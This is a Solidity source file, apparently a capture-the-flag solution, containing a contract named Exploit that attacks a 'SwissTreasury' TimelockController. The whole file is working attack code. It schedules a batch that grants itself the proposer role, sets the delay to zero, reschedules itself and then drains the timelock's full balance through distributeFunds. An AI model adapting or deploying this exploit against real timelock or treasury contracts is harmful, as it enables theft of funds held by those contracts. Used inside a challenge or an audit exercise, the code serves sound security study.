// SPDX-License-Identifier: MIT
pragma solidity 0.8.4;

import "./SwissTreasury.sol";

contract Exploit {
    bytes32 public constant PROPOSER_ROLE = keccak256("PROPOSER_ROLE");

    function doStuff(
        address _attacker,
        address payable _thisTimelock
    ) public {
        // define all the values going into the schedule call, should be a way to do it prettier/faster than this but just gonna do what works for now

        address[] memory targets = new address[](4);
        targets[0] = _thisTimelock;
        targets[1] = _thisTimelock;
        targets[3] = _thisTimelock;
        targets[2] = address(this);

        uint256[] memory values = new uint256[](4);
        values[0] = 0;
        values[1] = 0;
        values[2] = 0;
        values[3] = 0;
        bytes[] memory dataElements = new bytes[](4);
        dataElements[1] = abi.encodeWithSignature("updateDelay(uint256)", 0);
        dataElements[0] = abi.encodeWithSignature(
            "grantRole(bytes32,address)",
            keccak256("PROPOSER_ROLE"),
            address(this)
        );
        
        dataElements[3] = abi.encodeWithSignature(
            "distributeFunds(address,uint256)",
            address(this),
            _thisTimelock.balance
        );
        
        dataElements[2] = abi.encodeWithSignature(
            "doStuff(address,address)",
            _attacker,
            _thisTimelock
        );

        TimelockController(_thisTimelock).scheduleBatch(
            targets,
            values,
            dataElements,
            bytes32(0),
            bytes32(0),
            0
        );
    }

    receive() external payable {}
}